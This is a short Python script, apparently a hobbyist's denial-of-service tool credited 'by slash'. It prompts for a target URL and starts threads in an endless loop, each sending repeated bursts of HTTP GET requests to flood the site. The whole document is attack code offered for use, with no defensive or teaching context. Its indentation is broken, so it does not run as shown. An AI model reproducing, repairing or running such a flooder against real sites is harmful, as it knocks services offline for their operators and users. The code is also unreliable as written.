#dos
import threading
import requests
import time
	def dos():
		while 1:
			for i in range(50):
				requests.get(name)
			time.sleep(1)
print('by slash')
name = input('URL for attack -->  ')
while True:
	threading.Thread(target=dos).start()